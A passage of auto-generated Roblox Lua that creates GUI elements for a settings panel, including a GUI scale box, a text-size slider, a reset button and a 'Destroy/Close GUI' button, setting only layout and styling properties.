G2L["7d"]["TextSize"] = 14;
G2L["7d"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["7d"]["TextTransparency"] = 0.3;
G2L["7d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7d"]["BackgroundTransparency"] = 1;
G2L["7d"]["Size"] = UDim2.new(1, 0, 0, 15);
G2L["7d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7d"]["Text"] = [[More]];
G2L["7d"]["Name"] = [[text]];
G2L["7d"]["Position"] = UDim2.new(0.02273, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.moreTab.======TITLE======.text.text
G2L["7e"] = Instance.new("UIStroke", G2L["7d"]);
G2L["7e"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.moreTab.======TITLE======.text.UIPadding
G2L["7f"] = Instance.new("UIPadding", G2L["7d"]);
G2L["7f"]["PaddingLeft"] = UDim.new(0, 1);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.moreTab.======TITLE======.minimise
G2L["80"] = Instance.new("TextButton", G2L["7c"]);
G2L["80"]["BorderSizePixel"] = 0;
G2L["80"]["TextTransparency"] = 0.3;
G2L["80"]["TextSize"] = 14;
G2L["80"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["80"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["80"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["80"]["BackgroundTransparency"] = 1;
G2L["80"]["Size"] = UDim2.new(0, 35, 1, 0);
G2L["80"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["80"]["Text"] = [[-]];
G2L["80"]["Name"] = [[minimise]];
G2L["80"]["Position"] = UDim2.new(1, -30, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.moreTab.destroygui
G2L["81"] = Instance.new("Frame", G2L["75"]);
G2L["81"]["BorderSizePixel"] = 0;
G2L["81"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["81"]["Size"] = UDim2.new(1, 0, 0, 23);
G2L["81"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["81"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["81"]["Name"] = [[destroygui]];
G2L["81"]["LayoutOrder"] = 2;
G2L["81"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.moreTab.destroygui.button
G2L["82"] = Instance.new("TextButton", G2L["81"]);
G2L["82"]["BorderSizePixel"] = 0;
G2L["82"]["TextTransparency"] = 1;
G2L["82"]["TextSize"] = 14;
G2L["82"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["82"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["82"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["82"]["ZIndex"] = 49;
G2L["82"]["BackgroundTransparency"] = 1;
G2L["82"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["82"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["82"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.moreTab.destroygui.button.UIPadding
G2L["83"] = Instance.new("UIPadding", G2L["82"]);
G2L["83"]["PaddingTop"] = UDim.new(0, 2);
G2L["83"]["PaddingRight"] = UDim.new(0, 3);
G2L["83"]["PaddingLeft"] = UDim.new(0, 3);
G2L["83"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.moreTab.destroygui.button.buttonFrame
G2L["84"] = Instance.new("Frame", G2L["82"]);
G2L["84"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["84"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["84"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["84"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["84"]["Name"] = [[buttonFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.moreTab.destroygui.button.buttonFrame.outlineStroke
G2L["85"] = Instance.new("UIStroke", G2L["84"]);
G2L["85"]["Thickness"] = 2;
G2L["85"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.moreTab.destroygui.button.buttonFrame.buttonFade
G2L["86"] = Instance.new("CanvasGroup", G2L["84"]);
G2L["86"]["BorderSizePixel"] = 0;
G2L["86"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["86"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["86"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["86"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["86"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.moreTab.destroygui.button.buttonFrame.buttonFade.UIGradient
G2L["87"] = Instance.new("UIGradient", G2L["86"]);
G2L["87"]["Rotation"] = 90;
G2L["87"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.moreTab.destroygui.button.text
G2L["88"] = Instance.new("TextLabel", G2L["82"]);
G2L["88"]["ZIndex"] = 2;
G2L["88"]["BorderSizePixel"] = 0;
G2L["88"]["TextSize"] = 14;
G2L["88"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["88"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["88"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["88"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["88"]["BackgroundTransparency"] = 1;
G2L["88"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["88"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["88"]["Text"] = [[Destroy/Close GUI]];
G2L["88"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.moreTab.destroygui.button.text.text
G2L["89"] = Instance.new("UIStroke", G2L["88"]);
G2L["89"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.moreTab.destroygui.fillbar
G2L["8a"] = Instance.new("Frame", G2L["81"]);
G2L["8a"]["ZIndex"] = 90;
G2L["8a"]["BorderSizePixel"] = 0;
G2L["8a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8a"]["Size"] = UDim2.new(0, 0, 1, 0);
G2L["8a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8a"]["Name"] = [[fillbar]];
G2L["8a"]["BackgroundTransparency"] = 0.95;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside
G2L["8b"] = Instance.new("Frame", G2L["72"]);
G2L["8b"]["BorderSizePixel"] = 0;
G2L["8b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8b"]["Size"] = UDim2.new(0, 176, 0, 255);
G2L["8b"]["Position"] = UDim2.new(-0.00038, 0, 0, 0);
G2L["8b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8b"]["Name"] = [[leftside]];
G2L["8b"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.UIListLayout
G2L["8c"] = Instance.new("UIListLayout", G2L["8b"]);
G2L["8c"]["Padding"] = UDim.new(0, 5);
G2L["8c"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab
G2L["8d"] = Instance.new("Frame", G2L["8b"]);
G2L["8d"]["BorderSizePixel"] = 0;
G2L["8d"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
G2L["8d"]["Size"] = UDim2.new(0, 176, 0, 160);
G2L["8d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8d"]["Name"] = [[uisettingsTab]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.uisettingsScript
G2L["8e"] = Instance.new("LocalScript", G2L["8d"]);
G2L["8e"]["Name"] = [[uisettingsScript]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.ACCENT
G2L["8f"] = Instance.new("Frame", G2L["8d"]);
G2L["8f"]["ZIndex"] = 99;
G2L["8f"]["BorderSizePixel"] = 0;
G2L["8f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8f"]["Size"] = UDim2.new(1, 0, 0, 4);
G2L["8f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8f"]["Name"] = [[ACCENT]];
G2L["8f"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.ACCENT.GuiColor
G2L["90"] = Instance.new("Frame", G2L["8f"]);
G2L["90"]["ZIndex"] = 99;
G2L["90"]["BorderSizePixel"] = 0;
G2L["90"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
G2L["90"]["Size"] = UDim2.new(0, 174, 0, 2);
G2L["90"]["Position"] = UDim2.new(0, 1, 0, 1);
G2L["90"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["90"]["Name"] = [[GuiColor]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.ACCENT.GuiColor.UICorner
G2L["91"] = Instance.new("UICorner", G2L["90"]);



-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.UIListLayout
G2L["92"] = Instance.new("UIListLayout", G2L["8d"]);
G2L["92"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill;
G2L["92"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.TITLE
G2L["93"] = Instance.new("Frame", G2L["8d"]);
G2L["93"]["ZIndex"] = 99;
G2L["93"]["BorderSizePixel"] = 0;
G2L["93"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["93"]["Size"] = UDim2.new(1, 0, 0, 15);
G2L["93"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["93"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["93"]["Name"] = [[TITLE]];
G2L["93"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.TITLE.text
G2L["94"] = Instance.new("TextLabel", G2L["93"]);
G2L["94"]["TextWrapped"] = true;
G2L["94"]["ZIndex"] = 99;
G2L["94"]["BorderSizePixel"] = 0;
G2L["94"]["TextSize"] = 14;
G2L["94"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["94"]["TextTransparency"] = 0.3;
G2L["94"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["94"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["94"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["94"]["BackgroundTransparency"] = 1;
G2L["94"]["Size"] = UDim2.new(0, 172, 0, 15);
G2L["94"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["94"]["Text"] = [[UI Settings]];
G2L["94"]["Name"] = [[text]];
G2L["94"]["Position"] = UDim2.new(0.02273, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.TITLE.text.text
G2L["95"] = Instance.new("UIStroke", G2L["94"]);
G2L["95"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.TITLE.text.UIPadding
G2L["96"] = Instance.new("UIPadding", G2L["94"]);
G2L["96"]["PaddingLeft"] = UDim.new(0, 1);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.greystroke
G2L["97"] = Instance.new("UIStroke", G2L["8d"]);
G2L["97"]["ZIndex"] = 99;
G2L["97"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["97"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["97"]["Name"] = [[greystroke]];
G2L["97"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize
G2L["98"] = Instance.new("Frame", G2L["8d"]);
G2L["98"]["ZIndex"] = 99;
G2L["98"]["BorderSizePixel"] = 0;
G2L["98"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["98"]["Size"] = UDim2.new(1, 0, 0, 15);
G2L["98"]["Position"] = UDim2.new(0, 0, 0.11875, 0);
G2L["98"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["98"]["Name"] = [[textsize]];
G2L["98"]["LayoutOrder"] = 11;
G2L["98"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize.button
G2L["99"] = Instance.new("TextButton", G2L["98"]);
G2L["99"]["BorderSizePixel"] = 0;
G2L["99"]["TextTransparency"] = 1;
G2L["99"]["TextSize"] = 14;
G2L["99"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["99"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["99"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["99"]["ZIndex"] = 99;
G2L["99"]["BackgroundTransparency"] = 1;
G2L["99"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["99"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["99"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize.button.UIPadding
G2L["9a"] = Instance.new("UIPadding", G2L["99"]);
G2L["9a"]["PaddingTop"] = UDim.new(0, 2);
G2L["9a"]["PaddingRight"] = UDim.new(0, 3);
G2L["9a"]["PaddingLeft"] = UDim.new(0, 3);
G2L["9a"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize.button.sliderFrame
G2L["9b"] = Instance.new("Frame", G2L["99"]);
G2L["9b"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["9b"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["9b"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["9b"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["9b"]["Name"] = [[sliderFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize.button.sliderFrame.outlineStroke
G2L["9c"] = Instance.new("UIStroke", G2L["9b"]);
G2L["9c"]["Thickness"] = 2;
G2L["9c"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize.button.sliderFrame.buttonFade
G2L["9d"] = Instance.new("CanvasGroup", G2L["9b"]);
G2L["9d"]["BorderSizePixel"] = 0;
G2L["9d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9d"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9d"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["9d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9d"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize.button.sliderFrame.buttonFade.UIGradient
G2L["9e"] = Instance.new("UIGradient", G2L["9d"]);
G2L["9e"]["Rotation"] = 90;
G2L["9e"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize.button.sliderFrame.fillbar
G2L["9f"] = Instance.new("Frame", G2L["9b"]);
G2L["9f"]["ZIndex"] = 5;
G2L["9f"]["BorderSizePixel"] = 0;
G2L["9f"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
G2L["9f"]["Size"] = UDim2.new(0.5, 0, 1, 0);
G2L["9f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9f"]["Name"] = [[fillbar]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize.button.text
G2L["a0"] = Instance.new("TextLabel", G2L["99"]);
G2L["a0"]["ZIndex"] = 2;
G2L["a0"]["BorderSizePixel"] = 0;
G2L["a0"]["TextSize"] = 14;
G2L["a0"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a0"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a0"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a0"]["BackgroundTransparency"] = 1;
G2L["a0"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["a0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a0"]["Text"] = [[X/X]];
G2L["a0"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize.button.text.text
G2L["a1"] = Instance.new("UIStroke", G2L["a0"]);
G2L["a1"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsizeLABEL
G2L["a2"] = Instance.new("Frame", G2L["8d"]);
G2L["a2"]["ZIndex"] = 99;
G2L["a2"]["BorderSizePixel"] = 0;
G2L["a2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a2"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["a2"]["Position"] = UDim2.new(0, 0, 0.11875, 0);
G2L["a2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a2"]["Name"] = [[textsizeLABEL]];
G2L["a2"]["LayoutOrder"] = 10;
G2L["a2"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsizeLABEL.text
G2L["a3"] = Instance.new("TextLabel", G2L["a2"]);
G2L["a3"]["TextWrapped"] = true;
G2L["a3"]["ZIndex"] = 99;
G2L["a3"]["BorderSizePixel"] = 0;
G2L["a3"]["TextSize"] = 14;
G2L["a3"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["a3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a3"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a3"]["BackgroundTransparency"] = 1;
G2L["a3"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["a3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a3"]["Text"] = [[Text Size:]];
G2L["a3"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsizeLABEL.text.UIPadding
G2L["a4"] = Instance.new("UIPadding", G2L["a3"]);
G2L["a4"]["PaddingLeft"] = UDim.new(0, 6);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsizeLABEL.text.text
G2L["a5"] = Instance.new("UIStroke", G2L["a3"]);
G2L["a5"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize
G2L["a6"] = Instance.new("Frame", G2L["8d"]);
G2L["a6"]["ZIndex"] = 99;
G2L["a6"]["BorderSizePixel"] = 0;
G2L["a6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a6"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["a6"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["a6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a6"]["Name"] = [[guisize]];
G2L["a6"]["LayoutOrder"] = 1;
G2L["a6"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.UIPadding
G2L["a7"] = Instance.new("UIPadding", G2L["a6"]);
G2L["a7"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.guisize
G2L["a8"] = Instance.new("Frame", G2L["a6"]);
G2L["a8"]["ZIndex"] = 99;
G2L["a8"]["BorderSizePixel"] = 0;
G2L["a8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a8"]["Size"] = UDim2.new(0, 79, 0, 20);
G2L["a8"]["Position"] = UDim2.new(0.54598, 0, 0, 0);
G2L["a8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a8"]["Name"] = [[guisize]];
G2L["a8"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.guisize.UIPadding
G2L["a9"] = Instance.new("UIPadding", G2L["a8"]);
G2L["a9"]["PaddingTop"] = UDim.new(0, 2);
G2L["a9"]["PaddingRight"] = UDim.new(0, 3);
G2L["a9"]["PaddingLeft"] = UDim.new(0, 3);
G2L["a9"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.guisize.textbox
G2L["aa"] = Instance.new("TextBox", G2L["a8"]);
G2L["aa"]["Name"] = [[textbox]];
G2L["aa"]["PlaceholderColor3"] = Color3.fromRGB(0, 124, 255);
G2L["aa"]["TextSize"] = 14;
G2L["aa"]["TextColor3"] = Color3.fromRGB(0, 124, 255);
G2L["aa"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["aa"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["aa"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["aa"]["PlaceholderText"] = [[1.00]];
G2L["aa"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["aa"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["aa"]["Text"] = [[]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.guisize.textbox.outlineStroke
G2L["ab"] = Instance.new("UIStroke", G2L["aa"]);
G2L["ab"]["Thickness"] = 2;
G2L["ab"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["ab"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.guisize.textbox.buttonFade
G2L["ac"] = Instance.new("CanvasGroup", G2L["aa"]);
G2L["ac"]["BorderSizePixel"] = 0;
G2L["ac"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ac"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ac"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["ac"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ac"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.guisize.textbox.buttonFade.UIGradient
G2L["ad"] = Instance.new("UIGradient", G2L["ac"]);
G2L["ad"]["Rotation"] = 90;
G2L["ad"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.guisize.textbox.text
G2L["ae"] = Instance.new("UIStroke", G2L["aa"]);
G2L["ae"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.text
G2L["af"] = Instance.new("TextLabel", G2L["a6"]);
G2L["af"]["TextWrapped"] = true;
G2L["af"]["ZIndex"] = 99;
G2L["af"]["BorderSizePixel"] = 0;
G2L["af"]["TextSize"] = 14;
G2L["af"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["af"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["af"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["af"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["af"]["BackgroundTransparency"] = 1;
G2L["af"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["af"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["af"]["Text"] = [[GUI Scale:]];
G2L["af"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.text.UIPadding
G2L["b0"] = Instance.new("UIPadding", G2L["af"]);
G2L["b0"]["PaddingLeft"] = UDim.new(0, 4);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.text.text
G2L["b1"] = Instance.new("UIStroke", G2L["af"]);
G2L["b1"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault
G2L["b2"] = Instance.new("Frame", G2L["8d"]);
G2L["b2"]["ZIndex"] = 99;
G2L["b2"]["BorderSizePixel"] = 0;
G2L["b2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b2"]["Size"] = UDim2.new(1, 0, 0, 23);
G2L["b2"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["b2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b2"]["Name"] = [[resetdefault]];
G2L["b2"]["LayoutOrder"] = 100;
G2L["b2"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault.button
G2L["b3"] = Instance.new("TextButton", G2L["b2"]);
G2L["b3"]["BorderSizePixel"] = 0;
G2L["b3"]["TextTransparency"] = 1;
G2L["b3"]["TextSize"] = 14;
G2L["b3"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b3"]["ZIndex"] = 99;
G2L["b3"]["BackgroundTransparency"] = 1;
G2L["b3"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["b3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b3"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault.button.UIPadding
G2L["b4"] = Instance.new("UIPadding", G2L["b3"]);
G2L["b4"]["PaddingTop"] = UDim.new(0, 2);
G2L["b4"]["PaddingRight"] = UDim.new(0, 3);
G2L["b4"]["PaddingLeft"] = UDim.new(0, 3);
G2L["b4"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault.button.buttonFrame
G2L["b5"] = Instance.new("Frame", G2L["b3"]);
G2L["b5"]["ZIndex"] = 99;
G2L["b5"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["b5"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["b5"]["Size"] = UDim2.new(1, 0, 1, 0);
